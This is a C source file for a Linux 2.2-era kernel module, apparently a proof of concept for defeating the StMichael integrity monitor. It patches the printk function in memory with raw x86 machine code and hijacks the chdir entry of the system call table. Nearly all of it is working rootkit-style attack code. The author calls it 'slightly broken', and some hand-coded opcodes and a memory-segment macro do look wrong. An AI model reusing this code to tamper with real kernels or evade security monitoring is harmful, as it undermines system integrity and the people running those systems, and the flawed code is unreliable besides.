/* By MixMan MixMan <mixman@langusta.starnet.pl> 

 *
 * Slightly Broken.. 
 */

#define MODULE
#define __KERNEL__

#include <linux/sys.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/errno.h>
#include <linux/string.h>
#include <asm/segment.h>
#include <asm/unistd.h>
#include <linux/mm.h>
#include <linux/smp.h>
#include <linux/signal.h>
#include <linux/slab.h>
#include <asm/unistd.h>
#include <asm/current.h>
#include <sys/syscall.h>
#include <asm/errno.h>
#include <asm/ptrace.h>
#include <asm/pgtable.h>

#define BEGIN_KMEM      old_fs = get_fs(); set_fs(old_fs);
#define END_KMEM        set_fs(old_fs);

mm_segment_t old_fs;
extern void* sys_call_table[];
int (*write)(unsigned int,const char*,size_t);
int (*org_chdir)(const char*);

static void* function = NULL;
static unsigned char hacked = 0;
static unsigned char i_code[128];
static unsigned char i_code_len = 0;
static unsigned long i_ptr = 0;

/* x86 machine code that calls an arbitrary function. I haven't hardcoded the
   address of the function into the mov instruction becouse if I place it in
   a register like here, I don't have to play with the instruction opcode 
   (and making that isn't fun :) Also, the code saves the ebp register before
   changing it becouse on my box (x86 kernel 2.2.16, compiled with gcc 2.91.66) 
   StMichael isn't compiled by default with the -fomit-frame-pointer option,
   and for that I had to pay with a reboot :) */

static unsigned char c_prolog[] = "\x55"	// pushl %ebp
				  "\xDB";	// movl ADDR,%ebp
static unsigned char c_epilog[] = "\xFF"	//
				  "\xD5"	// call *%ebp
				  "\x5D"	// popl %ebp
				  "\x3C";	// ret

/* A user-space-like printf. Printk will be hacked so we can't use it */
static int printf(const char* fmt,...)
{
    va_list args;
    char buf[4096];
	
    if(!fmt) return -1;
    memset(buf,0,sizeof(buf));
    va_start(args,fmt);
    vsprintf(buf,fmt,args);
    va_end(args);
    BEGIN_KMEM
    write(1,buf,strlen(buf));
    END_KMEM
    return 0;
}

asmlinkage int hacked_chdir(const char* path)
{
    printf("Where do you want to go today ? ;-)\n");
    return;
}

/* hacked_printk does the traditional system call manipulation. We are 
   paranoid and simulate printk so that the returned value is correct */
asmlinkage int hacked_printk(const char* fmt,...)
{
    va_list args;
    char buf[4096];
    int i;
    
    if(!fmt) return 0;
    if(!hacked) {
	sys_call_table[SYS_chdir] = hacked_chdir;
	hacked = 1;
    }
    memset(buf,0,sizeof(buf));
    va_start(args,fmt);
    i = vsprintf(buf,fmt,args);
    va_end(args);
    return i;
}

/* init_module - dynamic creation of the machine code. It gets the address of
   an arbitrary kernel function and hacks it so, that it calls one of our
   functions without knowing it. I'm using printk, but this will work with 
   (almost) any function that is exported by the kernel */
int init_module(void)
{
    unsigned char code[128];
    
    write = sys_call_table[SYS_write];
    org_chdir = sys_call_table[SYS_chdir];
    
    printf("---===[ Trying to bypass StMichael, hold your breath...\n");

    function = printk;
    
    memset(i_code,0,sizeof(i_code));
    memset(code,0,sizeof(code));
    i_ptr = (unsigned long) hacked_printk;
    memcpy(code,c_prolog,strlen(c_prolog));
    i_code_len += strlen(c_prolog);    
    memcpy(code + i_code_len,&i_ptr,sizeof(i_ptr));
    i_code_len += sizeof(i_ptr);
    memcpy(code + i_code_len,c_epilog,strlen(c_epilog));
    i_code_len += strlen(c_epilog);
    memcpy(i_code,function,i_code_len);
    memcpy(function,code,i_code_len);
    
    printf("---===[ %u bytes of kernel code were changed. Now try to unload StMichael\n",
	   i_code_len);
    
    return 0;
}

/* We don't want to damage the kernel, so here the original function is being
   restored */
void cleanup_module(void)
{
    memcpy(function,i_code,i_code_len);
    sys_call_table[SYS_chdir] = org_chdir;
}
